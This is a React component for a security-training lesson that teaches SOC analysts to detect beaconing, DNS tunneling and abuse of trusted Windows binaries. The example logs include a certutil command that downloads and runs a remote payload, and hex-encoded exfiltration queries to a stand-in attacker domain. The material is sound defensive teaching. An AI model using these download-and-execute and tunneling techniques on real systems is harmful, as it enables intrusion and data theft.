import CodeBlock from '../../components/lesson/CodeBlock';
import Callout from '../../components/lesson/Callout';

export default function C2Detection() {
  return (
    <div className="prose-hh">
      <h1>Detecting C2: Beaconing, DNS Tunneling &amp; LOLBin Abuse</h1>
      <p>
        Once an attacker has a foothold, they need a way to keep talking to it — issuing commands, pulling
        down tools, pushing out stolen data. This lesson covers the three command-and-control patterns a SOC
        analyst runs into constantly: regular network beaconing, DNS used as a covert channel, and attackers
        hiding inside binaries Windows already trusts.
      </p>

      <h2>Beaconing: the timing IS the signature</h2>
      <p>
        Most C2 frameworks (Cobalt Strike among the most widely deployed, legitimately and otherwise) don't
        maintain an open connection — the implant "checks in" on an interval, asking a controller server
        whether it has any new commands to run. A single check-in request looks like completely unremarkable
        HTTPS traffic. The pattern only becomes visible when you stop looking at individual requests and
        start looking at the <em>timing</em> across many of them.
      </p>
      <CodeBlock label="normal browsing vs. a beacon, same log format">{`2026-07-12 09:00:01  WKSTN07 -> www.google.com:443       (browsing — irregular)
2026-07-12 09:00:14  WKSTN07 -> cdn.jsdelivr.net:443      (asset load — irregular)
2026-07-12 09:01:02  WKSTN07 -> 91.203.5.44:443           (check-in #1)
2026-07-12 09:02:03  WKSTN07 -> 91.203.5.44:443           (check-in #2)  <- ~61s later
2026-07-12 09:03:04  WKSTN07 -> 91.203.5.44:443           (check-in #3)  <- ~61s later
2026-07-12 09:04:03  WKSTN07 -> 91.203.5.44:443           (check-in #4)  <- ~59s later`}</CodeBlock>
      <p>
        Human browsing is bursty and irregular. A destination that gets hit every ~60 seconds, almost to the
        second, for hours at a time, is not a human clicking links — it's software running on a timer.
        Real frameworks add <strong>jitter</strong> (a randomized percentage added to the interval) precisely
        to defeat naive "exactly every N seconds" detection, so mature detection logic looks for connections
        clustering within a variance window (e.g. 60s ± 20%) rather than an exact repeat.
      </p>

      <h2>DNS tunneling: exfiltration through the one protocol nobody blocks</h2>
      <p>
        Outbound firewalls are usually strict about arbitrary ports and protocols, but DNS is almost always
        wide open — every device needs to resolve names to function at all. Attackers exploit exactly that
        trust: stolen data gets encoded into the subdomain labels of DNS queries themselves, sent to a domain
        the attacker controls the authoritative nameserver for.
      </p>
      <CodeBlock label="TXT queries carrying hex-encoded data, not real lookups">{`09:10:15 WKSTN12 TXT   4a6f696e5468654c65616b3130.exfil-relay.example
09:10:16 WKSTN12 TXT   32303236303731325f7061727431.exfil-relay.example
09:10:17 WKSTN12 TXT   5f637573746f6d65725f6461746162.exfil-relay.example
--- 40+ TXT queries to exfil-relay.example in 20 minutes, none of them normal SPF/DKIM lookups ---`}</CodeBlock>
      <p>
        Two things make this pattern recognizable: the query <em>type</em> (a flood of TXT lookups — normal
        traffic sends a handful, for SPF/DKIM, not dozens per minute) and the query <em>shape</em> (long,
        high-entropy-looking subdomain labels, because the tunnel has to chunk the stolen data across many
        queries to stay under each query's size limit). Neither tell is visible from a single query in
        isolation — this is a volume-and-pattern detection, the same class of problem as beacon timing above.
      </p>

      <h2>LOLBins: hiding inside binaries the OS already trusts</h2>
      <p>
        "Living off the land" means using legitimate, pre-installed, digitally-signed system tools to do
        malicious things, instead of dropping a custom executable that antivirus might flag on sight.
        <code>certutil.exe</code> is the canonical example: it's a real Windows certificate-management
        utility, but it also ships with an undocumented-by-design ability to download arbitrary files.
      </p>
      <CodeBlock label="a legitimate binary, an illegitimate use of it">{`09:41:12 WKSTN22 winword.exe   started by jsmith (opened invoice.docm)
09:41:19 WKSTN22 certutil.exe -urlcache -split -f http://185.220.101.9/update.exe C:\\Windows\\Temp\\update.exe
09:41:21 WKSTN22 update.exe    started by jsmith  <-- the downloaded payload executing`}</CodeBlock>
      <p>
        Nothing about <code>certutil.exe</code> running is itself suspicious — it runs constantly for
        legitimate certificate operations. The detection has to be about the specific flag combination
        (<code>-urlcache -split -f</code>, its file-download mode) paired with a suspicious destination,
        not the binary name alone. Other common LOLBins work the same way:{' '}
        <code>mshta.exe</code> (executes remote HTA/JavaScript), <code>rundll32.exe</code> (runs arbitrary
        exported DLL functions), and <code>regsvr32.exe</code> (can execute a scriptlet fetched from a
        remote URL, a technique documented by MITRE as T1218.010).
      </p>

      <Callout variant="incident">
        <p>
          <strong>Real-world precedent:</strong> the threat group FIN7 — responsible for hundreds of millions
          of dollars in stolen payment card data across multi-year campaigns — relied heavily on LOLBin
          techniques and legitimate remote-access tools specifically to blend into normal administrative
          traffic, and Russian intelligence-linked group APT29 has been documented using DNS-based covert
          channels for C2 communication. In both cases, the individual building blocks (a signed Windows
          binary, a DNS query) were completely ordinary — the malicious use only became visible through
          exactly the pattern-over-time analysis this lesson covers.
        </p>
      </Callout>

      <h2>The common thread: none of these are signature detections</h2>
      <p>
        Antivirus and simple string-matching rules struggle with all three of these techniques for the same
        reason: nothing about a single beacon packet, a single DNS query, or a single certutil invocation is
        inherently malicious. Each one only becomes detectable when an analyst (or a correlation rule built
        by one) looks at <strong>volume, timing, and combination</strong> across a window of activity — the
        exact skill the labs in this module put you in the seat to practice.
      </p>

      <Callout variant="tip">
        <p>
          When triaging any of these three, the fastest first move is the same: isolate the one destination,
          domain, or process that stands out by volume or regularity (<code>grep</code> for the suspect
          indicator, then eyeball timestamps), rather than reading a log file top to bottom. The anomaly is
          almost always a small fraction of an otherwise-normal-looking log.
        </p>
      </Callout>

      <p>
        With alert triage, threat hunting, ATT&amp;CK coverage mapping, and now C2 detection covered, the
        next module goes deep on the platforms all of this actually runs on — real SIEM products, their
        query languages, and how they differ in practice.
      </p>
    </div>
  );
}